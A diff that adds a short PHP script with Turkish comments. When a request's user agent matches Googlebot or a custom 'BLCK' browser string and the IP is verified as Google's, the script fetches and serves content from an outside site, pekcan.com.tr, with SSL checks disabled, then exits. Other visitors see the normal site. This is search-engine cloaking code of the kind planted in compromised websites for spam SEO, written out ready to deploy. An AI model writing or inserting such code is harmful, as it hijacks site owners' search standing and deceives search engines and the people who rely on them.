@@ -1,0 +1,51 @@
+<?php
+// Kullanıcı ajanını al
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+
+// Google IP doğrulama fonksiyonu
+function isGoogleBot($ip) {
+    $host = gethostbyaddr($ip);
+    return (
+        stripos($host, 'googlebot.com') !== false ||
+        stripos($host, 'google.com') !== false
+    ) && gethostbyname($host) === $ip;
+}
+
+// Ekstra kullanıcı ajanları
+$allowedUserAgents = [
+    'Googlebot',
+    'Mozilla/5.0 BLCK (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36'
+];
+
+// Kullanıcı ajanını kontrol et
+$isAllowedUserAgent = false;
+foreach ($allowedUserAgents as $allowedAgent) {
+    if (stripos($userAgent, $allowedAgent) !== false) {
+        $isAllowedUserAgent = true;
+        break;
+    }
+}
+
+// Gelen IP adresini al
+$ipAddress = $_SERVER['REMOTE_ADDR'];
+
+// Eğer Googlebot veya izin verilen bir ajan ise ve IP doğrulandıysa
+if ($isAllowedUserAgent && isGoogleBot($ipAddress)) {
+    // Gösterilecek URL
+    $url = 'https://pekcan.com.tr/';
+
+    // İçeriği al (cURL ile)
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // SSL hatalarını yok sayar
+    $content = curl_exec($ch);
+    curl_close($ch);
+
+    // İçeriği ekrana yazdır
+    echo $content;
+
+    // İleride başka işlemler yapılmasını engelle
+    exit;
+}
+?>
